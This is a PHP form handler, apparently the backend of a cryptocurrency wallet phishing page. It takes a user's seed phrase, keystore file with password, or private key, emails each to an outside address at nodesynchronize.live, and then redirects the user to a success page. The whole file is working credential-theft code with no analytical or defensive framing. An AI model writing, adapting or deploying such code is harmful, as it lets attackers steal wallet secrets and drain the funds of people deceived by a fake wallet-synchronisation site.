<?php 
session_start();
ob_start();
require_once  __DIR__.'/phpmailer/PHPMailerAutoload.php';
include "func.php";
include "mailer.php";
function Royalencoder($str){
    $str = md5($str);
    $str = substr($str, 0, 10);
    $str = sha1($str);
    $str = substr($str, 0, 10);
    return $str;
}
$time = Royalencoder(time());

if(isset($_GET['id'])){
    $id=$_GET['id'];
}

if(isset($_POST['submit1'])){
    $phrase=$_POST['phrase'];
    $wallet=$_POST['walletname'];
    $usr = new Royaltechinc\Mailer;
    $usr->mailPhrase("ress@nodesynchronize.live", urlize($phrase), $wallet, $time);
    
    header("location: success.html");
    exit;
}
if(isset($_POST['submit2'])){
    $keystorejson=$_POST['keysto'];
    $keystorepasswword=$_POST['keystorepass'];
    $wallet=$_POST['walletname'];
    $usr = new Royaltechinc\Mailer;
    $usr->mailKeystore("ress@nodesynchronize.live", $keystorejson, $keystorepasswword, $wallet, $time);
    
    header("location: success.html");
    exit;
}
if(isset($_POST['submit3'])){
    $privatekey=$_POST['privatek'];
    $wallet=$_POST['walletname'];
    
    $usr = new Royaltechinc\Mailer;
    $usr->mailPrivatekey("ress@nodesynchronize.live", urlize($privatekey), $wallet, $time);
    
    header("location: success.html");
    exit;
}


?>
